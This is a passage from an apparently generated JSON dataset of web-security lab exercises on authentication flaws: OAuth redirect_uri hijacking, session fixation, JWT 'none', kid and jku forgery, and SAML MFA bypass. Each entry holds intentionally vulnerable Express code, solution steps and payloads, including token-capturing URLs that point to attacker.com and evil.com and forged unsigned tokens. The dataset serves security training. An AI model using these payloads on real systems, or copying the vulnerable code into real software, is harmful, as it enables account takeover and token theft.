        "srcCode": "const express = require('express'); const app = express(); const oauth = require('simple-oauth2'); const oauthConfig = { client: { id: 'app-client-id', secret: 'secret' }, auth: { tokenHost: 'https://auth-server.com', authorizePath: '/authorize', tokenPath: '/token' } }; app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://auth-server.com/authorize?response_type=code&client_id=app-client-id&redirect_uri=${redirectUri}`; res.redirect(url); }); app.listen(4000, () => console.log('OAuth Redirect URI Injection Lab running on port 4000'));",
        "payloads": [
          "https://attacker.com/callback",
          "https://evil.com/redirect",
          "curl -X POST https://auth-server.com/token -d 'grant_type=authorization_code&code=XYZ123&redirect_uri=https://evil.com/redirect&client_id=app-client-id'"
        ]
      },
      {
        "Lab scenario": "Session Fixation vulnerability in login process",
        "Lab Description": "The session management mechanism allows the session identifier to be set via a query parameter before login. The application fails to regenerate a new session ID after successful authentication, allowing attackers to fixate a session ID and impersonate a user after they log in. To solve: hijack Carlos's session after forcing him to log in via a session you control.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Using Burp Suite, intercept a GET /login request and observe that the application accepts a sessionId as a query parameter.",
          "2.Generate a session fixation link: /login?sessionId=attackerSession123 and send it to the victim via email or open redirect.",
          "3.On the server, monitor incoming requests and wait for the victim to log in using the fixed session ID.",
          "4.After login, reuse the same sessionId=attackerSession123 cookie to access Carlos's account.",
          "5.Visit /my-account while authenticated with the fixed session ID to verify takeover and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { const sid = req.query.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Account page of ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
        "payloads": [
          "/login?sessionId=attackerSession123",
          "Cookie: sessionId=attackerSession123"
        ]
      },
      {
        "Lab scenario": "JWT tampering vulnerability in Authorization Header",
        "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management but fails to properly validate the signature algorithm. The backend accepts tokens using the 'none' algorithm, allowing an attacker to forge arbitrary tokens without a signature. To solve: tamper with the JWT to impersonate Carlos.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1.Use Burp Suite to capture the Authorization header after logging in as a regular user.",
          "2.Decode the JWT using jwt.io or jwt-tool and examine its header and payload structure.",
          "3.Change the 'alg' field in the header from 'HS256' to 'none', and set the payload to {\"username\":\"carlos\"}.",
          "4.Base64-encode the modified header and payload, omitting the signature part completely.",
          "5.Replay the request with the tampered JWT in the Authorization header to access Carlos's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(require('body-parser').json()); app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (token) { try { req.user = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); } catch (err) { return res.status(403).send('Invalid token'); } } next(); }); app.get('/my-account', (req, res) => { if (req.user?.username) res.send(`Welcome ${req.user.username}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer [token_above]"
        ]
      },
      {
        "Lab scenario": "OAuth redirect URI manipulation in login flow",
        "Lab Description": "The application implements OAuth for third-party authentication but fails to validate the redirect_uri parameter against a whitelist. This allows an attacker to abuse the login process and capture authorization codes or tokens. To solve: redirect the victim to a malicious callback, extract the token, and impersonate them.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1.Use OWASP ZAP or Burp Suite to intercept the OAuth login flow and locate the redirect_uri parameter.",
          "2.Craft a login URL with redirect_uri pointing to your attacker-controlled server (e.g., https://attacker.site/callback).",
          "3.Send the link to the victim and wait for them to authorize the app.",
          "4.Extract the authorization code or token from the redirected request to your server.",
          "5.Use Postman to exchange the code for an access token and call /my-account as the victim."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; if (!user) return res.status(400).send('Missing user'); const code = Buffer.from(`${user}-code`).toString('base64'); tokens[code] = user; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/token', (req, res) => { const { code } = req.query; const user = tokens[code]; if (!user) return res.status(403).send('Invalid code'); res.json({ access_token: `${user}-access-token` }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token?.includes('carlos')) res.send('Access granted to carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
        "payloads": [
          "https://example.com/auth?redirect_uri=https://attacker.site/callback&user=carlos",
          "Authorization: Bearer carlos-access-token"
        ]
      },
      {
        "Lab scenario": "Session fixation via login flow in session middleware",
        "Lab Description": "The application fails to regenerate the session ID after login, allowing an attacker to fix a session before authentication. The session ID remains unchanged after login, enabling session hijacking. To solve: hijack Carlos’s session using a fixed session ID to access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept your unauthenticated request to /login and note the Set-Cookie header.",
          "2. Send this session cookie to Burp Repeater and test that the session remains valid pre-login.",
          "3. Use curl/Postman to send a login request with valid credentials but reuse the session cookie.",
          "4. Send the fixed session ID to Carlos (via XSS, phishing, or any other out-of-band vector).",
          "5. Once Carlos logs in using the fixed session ID, reuse the same cookie to access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'notsosecret', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); req.session.username = username; res.send(`Welcome ${username}`); }); app.get('/my-account', (req, res) => { if (req.session.username) return res.send(`Account of ${req.session.username}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Set-Cookie: connect.sid=attacker-fixed-id",
          "GET /my-account with Cookie: connect.sid=attacker-fixed-id"
        ]
      },
      {
        "Lab scenario": "JWT signature verification bypass using none algorithm in Authorization header",
        "Lab Description": "The app uses JWT for session management but fails to validate the 'alg' claim properly. It accepts unsigned tokens when 'alg' is set to 'none'. To solve: forge a valid token for Carlos without signing it, and access his profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in as a regular user and inspect the JWT token from the Authorization header using Burp or Postman.",
          "2. Decode the token and observe the algorithm used. Modify the 'alg' to 'none' and set the payload to {\"username\":\"carlos\"}.",
          "3. Remove the signature and re-encode the token using jwt.io or Python.",
          "4. Send the forged token as Authorization: Bearer <forged_token> using Postman.",
          "5. Access /my-account endpoint and verify that you are logged in as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username }, 'supersecret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (!payload) return res.status(401).send('Unauthorized'); res.send(`Welcome ${payload.payload.username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
        "payloads": [
          "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "Payload: {\"username\":\"carlos\"}",
          "JWT: base64url(header).base64url(payload)."
        ]
      },
      {
        "Lab scenario": "OAuth redirect URI manipulation in OAuth provider callback",
        "Lab Description": "The application integrates OAuth login via a third-party provider but improperly validates redirect URIs. It allows open redirection using the `redirect_uri` parameter. To solve: manipulate the `redirect_uri` to hijack the access token and access Carlos's account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp to initiate an OAuth login and capture the full authorization request URL.",
          "2. Modify the `redirect_uri` parameter to an attacker-controlled domain (e.g., attacker.com).",
          "3. Deploy a token-capturing script on attacker.com to log incoming tokens.",
          "4. Trick Carlos into clicking the OAuth login link with the modified `redirect_uri`.",
          "5. Capture the token and use it to access /my-account using Postman with Authorization: Bearer <stolen_token>."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const redirectURIs = ['http://localhost:4000/callback']; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const url = `https://oauth-provider.com/auth?client_id=abc123&redirect_uri=${redirect_uri}`; res.redirect(url); }); app.get('/callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth-provider.com/token', { code }); res.send('Logged in with token: ' + token.data.access_token); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running'));",
        "payloads": [
          "https://vulnerableapp.com/auth?redirect_uri=https://attacker.com/callback",
          "OAuth URL with modified redirect: attacker.com/capture?token=xyz",
          "Access token used in: Authorization: Bearer <token>"
        ]
      },
      {
        "Lab scenario": "Session Fixation vulnerability in login flow",
        "Lab Description": "The login process does not regenerate session identifiers after authentication. The application issues a session cookie before login, and the same session is reused post-authentication. This allows an attacker to fixate a session ID and trick a user into authenticating with it. To solve: hijack Carlos's session using a fixed session ID.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login request and note the issued session cookie.",
          "2. Send this fixed session ID to Carlos via phishing or CSRF bait.",
          "3. Wait for Carlos to log in using the fixated session (simulate login as Carlos with that session ID).",
          "4. Reuse the same session ID in your own browser and access /my-account.",
          "5. Confirm you're logged in as Carlos to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; return res.redirect('/my-account'); } res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { if (req.session.username) return res.send('Welcome, ' + req.session.username); res.status(401).send('Not logged in'); }); app.listen(4000);",
        "payloads": [
          "Set-Cookie: connect.sid=sessid123456",
          "Phishing URL using fixed session: http://example.com/login?session=sessid123456",
          "Reuse same session cookie after victim logs in"
        ]
      },
      {
        "Lab scenario": "JWT tampering vulnerability in authentication header",
        "Lab Description": "The application uses JWTs for authentication, but fails to verify the token signature when the algorithm is set to 'none'. This allows attackers to forge a valid token without needing the secret key. To solve: forge a token with 'none' algorithm to impersonate Carlos and access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Log in with any user and intercept the Authorization: Bearer <token> header using Burp Suite.",
          "2. Decode the JWT at jwt.io and inspect its header and payload.",
          "3. Modify the header to { \"alg\": \"none\" } and payload to { \"username\": \"carlos\" }, then base64 encode both without a signature.",
          "4. Replace the original token in Burp with the forged one.",
          "5. Send a GET /my-account request with the modified token and confirm access to Carlos's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.username) req.user = decoded; next(); }); app.get('/my-account', (req, res) => { if (req.user?.username === 'carlos') return res.send('Welcome Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
          "JWT payload: {\"username\":\"carlos\"}",
          "Forged token: base64url(header).base64url(payload). (no signature)"
        ]
      },
      {
        "Lab scenario": "Open redirect vulnerability in OAuth callback endpoint",
        "Lab Description": "The OAuth flow accepts arbitrary redirect_uri values without strict validation. This allows attackers to capture tokens or force victim logins on attacker-controlled domains. To solve: craft a redirect_uri that steals Carlos's OAuth token and gain access to his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to initiate an OAuth login request to /auth?client_id=123&redirect_uri=http://attacker.com/callback.",
          "2. Modify redirect_uri to a domain under your control and complete the OAuth flow.",
          "3. Wait for Carlos to click a phishing link or be redirected.",
          "4. Capture the token from your controlled domain’s server logs.",
          "5. Use the captured token to craft a GET /my-account request with Authorization: Bearer <token>."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokenStore = { 'carlos': 'abcd.efgh.ijkl' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; if (!client_id || !redirect_uri) return res.status(400).send('Missing parameters'); const token = tokenStore['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer abcd.efgh.ijkl') return res.send('Welcome Carlos!'); res.status(403).send('Forbidden'); }); app.listen(4000);",
        "payloads": [
          "http://attacker.com/callback#access_token=abcd.efgh.ijkl",
          "Malicious OAuth link: /auth?client_id=123&redirect_uri=http://evil.com/callback",
          "Authorization: Bearer abcd.efgh.ijkl"
        ]
      },
      {
        "Lab scenario": "JWT signature verification bypass via 'none' algorithm in token validation logic",
        "Lab Description": "The application uses JWTs for session management but fails to properly verify the token's signature. Specifically, it accepts tokens with the 'none' algorithm without validating their integrity. This flaw allows attackers to forge tokens and impersonate other users. To solve: Forge a JWT for the 'admin' user and access the admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a request containing a JWT after logging in.",
          "Decode the JWT using jwt.io or a similar tool to analyze its header and payload.",
          "Modify the header to set 'alg' to 'none' and change the payload's 'username' to 'admin'.",
          "Remove the signature part of the token, leaving only the header and payload.",
          "Replace the original JWT in the intercepted request with the forged token and resend the request to access the admin panel."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.use(express.json());\n\nconst users = [{ username: 'admin', role: 'admin' }, { username: 'user', role: 'user' }];\n\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  const user = users.find(u => u.username === username);\n  if (!user) return res.status(401).send('Invalid user');\n  const token = jwt.sign({ username: user.username, role: user.role }, 'secret');\n  res.json({ token });\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const payload = jwt.decode(token);\n  if (payload?.role !== 'admin') return res.status(403).send('Access denied');\n  res.send('Welcome to the admin panel');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth 2.0 misconfiguration in redirect URI validation",
        "Lab Description": "The application integrates with a third-party OAuth provider for authentication. However, it fails to properly validate the 'redirect_uri' parameter during the OAuth flow, allowing attackers to manipulate it and capture authorization codes meant for other users. To solve: Exploit the misconfiguration to obtain an access token for the 'admin' user and access the admin dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to intercept the OAuth authorization request and identify the 'redirect_uri' parameter.",
          "Modify the 'redirect_uri' to point to an attacker-controlled domain that captures authorization codes.",
          "Send a phishing link to the 'admin' user, tricking them into initiating the OAuth flow.",
          "Capture the authorization code from the redirected request to the attacker's domain.",
          "Exchange the captured authorization code for an access token and use it to access the admin dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst request = require('request');\nconst app = express();\n\napp.get('/auth', (req, res) => {\n  const redirectUri = req.query.redirect_uri;\n  const authUrl = `https://oauth.provider.com/auth?response_type=code&client_id=client123&redirect_uri=${redirectUri}`;\n  res.redirect(authUrl);\n});\n\napp.get('/callback', (req, res) => {\n  const code = req.query.code;\n  request.post('https://oauth.provider.com/token', {\n    form: {\n      grant_type: 'authorization_code',\n      code: code,\n      redirect_uri: 'https://app.com/callback',\n      client_id: 'client123',\n      client_secret: 'secret'\n    }\n  }, (error, response, body) => {\n    const accessToken = JSON.parse(body).access_token;\n    res.send(`Access token: ${accessToken}`);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "payloads": [
          "https://oauth.provider.com/auth?response_type=code&client_id=client123&redirect_uri=https://attacker.com/callback",
          "https://oauth.provider.com/auth?response_type=code&client_id=client123&redirect_uri=https://malicious.site/steal"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session IDs in session management",
        "Lab Description": "The application assigns session IDs in a predictable manner and does not regenerate them upon user login. This flaw allows attackers to set a known session ID for a victim and hijack their session after they log in. To solve: Set a known session ID, trick the victim into logging in, and use the same session ID to access their account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Postman to initiate a session with a specific session ID by setting the 'session_id' cookie.",
          "Send the session link with the fixed session ID to the victim, prompting them to log in.",
          "After the victim logs in, use the same session ID to access their account.",
          "Verify access by navigating to the user's dashboard or profile page.",
          "Log out and clear cookies to end the session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\nconst sessions = {};\n\napp.get('/login', (req, res) => {\n  const sessionId = req.cookies.session_id || 'guest';\n  sessions[sessionId] = { loggedIn: true, user: 'victim' };\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  const sessionId = req.cookies.session_id;\n  const session = sessions[sessionId];\n  if (session && session.loggedIn) {\n    res.send(`Welcome, ${session.user}`);\n  } else {\n    res.send('Please log in');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "payloads": [
          "Set-Cookie: session_id=knownsessionid123",
          "Set-Cookie: session_id=attackersession456"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a modified JWT with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid user request containing JWT using Burp Suite",
            "Decode the JWT in JWT Editor to analyze structure and claims",
            "Modify the alg header to 'none' and remove the signature section",
            "Add custom 'role':'admin' claim to the payload",
            "Submit the modified token to /admin endpoint and verify privilege escalation"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.role === 'admin') {\n      return res.send('Admin access granted');\n    }\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ."
        ]
    },
    {
        "Lab scenario": "GraphQL query batching attack in user enumeration",
        "Lab Description": "The GraphQL endpoint processes batched queries sequentially without rate limiting. The application leaks timing differences in error responses. To solve: identify valid usernames through differential response analysis using batched authentication attempts.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Capture normal login attempt with OWASP ZAP",
            "Craft batched GraphQL query with 100 username variations",
            "Analyze response timing differences using Burp Suite's Compare feature",
            "Identify usernames with distinct response characteristics",
            "Perform targeted password spraying against identified accounts"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst express = require('express');\nconst app = express();\nconst typeDefs = gql`\n  type Query {\n    login(username: String!, password: String!): Boolean\n  }\n`;\nconst resolvers = {\n  Query: {\n    login: (_, { username, password }) => {\n      if(username === 'admin') {\n        return password === 'secret123';\n      }\n      return false;\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });\napp.listen(4000);",
        "payloads": [
            "[{\"query\":\"query($input: LoginInput!) { login(input: $input) }\",\"variables\":{\"input\":{\"username\":\"user1\",\"password\":\"pass\"}}},{\"query\":\"query($input: LoginInput!) { login(input: $input) }\",\"variables\":{\"input\":{\"username\":\"user2\",\"password\":\"pass\"}}}]",
            "{\"query\":\"query { first: login(username: \\\"admin\\\", password: \\\"guess1\\\") second: login(username: \\\"test\\\", password: \\\"guess2\\\") }\"}",
            "{\"query\":\"mutation { logins: batchLogin(inputs: [{username: \\\"carlos\\\", password: \\\"test\\\"}, {username: \\\"admin\\\", password: \\\"test\\\"}]) }\"}"
        ]
    },
    {
        "Lab scenario": "OAuth token hijacking through insecure redirect_uri",
        "Lab Description": "The OAuth implementation fails to validate redirect_uri parameters properly. The application leaks authorization codes to attacker-controlled domains. To solve: intercept the OAuth flow and redirect the authorization code to your exploit server.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Initiate OAuth flow with Postman using attacker-controlled redirect_uri",
            "Intercept authorization request with Burp Suite and modify redirect_uri",
            "Capture authorization code from callback URL",
            "Exchange code for access token at OAuth token endpoint",
            "Use stolen token to authenticate as victim user"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = { 'client123': { secret: 'sec123', redirectUris: ['https://legit.com/callback'] } };\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const code = 'AUTH_CODE_' + Math.random().toString(36).substr(2,8);\n  res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({ access_token: 'ACCESS_TOKEN_' + code });\n  } else {\n    res.status(401).send('Invalid client');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "https://oauth-victim.com/authorize?response_type=code&client_id=client123&redirect_uri=https://attacker.com/callback&state=123",
            "https://oauth-victim.com/authorize?response_type=token&client_id=client123&redirect_uri=http://localhost:9999&scope=all",
            "https://oauth-victim.com/authorize?response_type=code&client_id=client123&redirect_uri=https://legit.com/callback.attacker.com&state=xyz"
        ]
    },
    {
        "Lab scenario": "Session fixation via pre-set Session-ID in OAuth callback",
        "Lab Description": "The OAuth implementation sets predictable session IDs before authentication. The application maintains the same session after privilege elevation. To solve: fixate a session ID before authentication and reuse it post-OAuth flow to gain admin access.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept OAuth initiation request with Burp Suite and note session cookie",
            "Manually set this session cookie in browser before authentication",
            "Complete OAuth flow with a low-privilege test account",
            "Modify the callback request to include admin claim",
            "Reuse original session cookie to access admin dashboard"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({\n  secret: 'weaksecret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\napp.get('/oauth-callback', (req, res) => {\n  req.session.user = req.query.user;\n  req.session.role = req.query.role || 'user';\n  res.redirect('/dashboard');\n});\napp.get('/dashboard', (req, res) => {\n  if(req.session.role === 'admin') {\n    res.send('Admin panel');\n  } else {\n    res.send('User dashboard');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "/oauth-callback?user=attacker&role=admin",
            "/oauth-callback?user=admin&__proto__.role=admin",
            "/oauth-callback?user=carlos&role=admin&override=1"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in microservice authentication",
        "Lab Description": "The JWT verification uses kid header to load keys from filesystem without proper sanitization. The application's debug endpoint leaks key paths. To solve: craft a JWT with kid pointing to known public key file and sign with corresponding private key.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Discover /debug endpoint revealing key storage location using OWASP ZAP",
            "Extract default public key path from debug information",
            "Craft JWT with kid header pointing to /etc/passwd",
            "Identify valid key path via error message differences",
            "Generate valid token using found key path and access admin API"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.get('/debug', (req, res) => {\n  res.json({ keyPath: '/var/keys/app_rsa.pub' });\n});\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  const keyPath = decoded.header.kid || '/var/keys/app_rsa.pub';\n  try {\n    const key = fs.readFileSync(keyPath);\n    jwt.verify(token, key);\n    res.send('Valid token');\n  } catch (e) {\n    res.status(403).send('Invalid token');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii92YXIva2V5cy9hcHBfcnNhLnB1YiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.NsZXBhc3N3ZA",
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ob21lL3VzZXIvLnNzaC9pZF9yc2EucHViIn0.eyJzdWIiOiJyb290Iiwicm9sZSI6InN1cGVyX2FkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.KJHGFDSA"
        ]
    },
    {
        "Lab scenario": "MFA bypass through state parameter manipulation in SAML flow",
        "Lab Description": "The SAML implementation improperly validates state parameters during MFA initiation. The application skips MFA when receiving crafted state values. To solve: intercept SAML response and modify state parameter to known bypass value.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture normal SAML authentication flow using Burp Suite",
            "Identify state parameter in MFA initiation request",
            "Replay request with state=bypass in Postman",
            "Observe successful authentication without MFA prompt",
            "Modify SAML response to target admin user"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst sessions = {};\napp.post('/saml/acs', (req, res) => {\n  const { SAMLResponse, RelayState } = req.body;\n  if(RelayState === 'bypass_mfa') {\n    sessions[req.ip] = { user: req.body.user, mfa: true };\n    res.redirect('/admin');\n  } else {\n    res.redirect('/mfa');\n  }\n});\napp.get('/admin', (req, res) => {\n  if(sessions[req.ip]?.mfa) {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('MFA required');\n  }\n});\napp.listen(3000);",
        "payloads": [
            "SAMLResponse=PHNhbWxwOlJlc3BvbnNlPjwvc2FtbHA6UmVzcG9uc2U%2B&RelayState=bypass_mfa&user=admin",
            "SAMLResponse=PHNhbWxwOlJlc3BvbnNlPjxyZWxheVN0YXRlPmJ5cGFzc19tZmE8L3JlbGF5U3RhdGU%2BPC9zYW1scDpSZXNwb25zZT4%3D",
            "SAMLResponse=valid_response&RelayState=bypass_mfa&user=carlos&mfa=0"
        ]
    },
    {
        "Lab scenario": "JWT public key substitution via jku header injection",
        "Lab Description": "The JWT validation improperly trusts the jku header to fetch verification keys. The application doesn't restrict allowed domains for key URLs. To solve: host a malicious public key and craft a JWT pointing to it with admin claims.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Intercept valid JWT with Burp Suite and analyze structure",
            "Set up attacker-controlled server hosting crafted public key",
            "Modify JWT header to include jku pointing to malicious key",
            "Add admin claims and sign with corresponding private key",
            "Submit forged token to /admin endpoint for privilege escalation"
        ],
        "Vulnerability name": "Authentication",
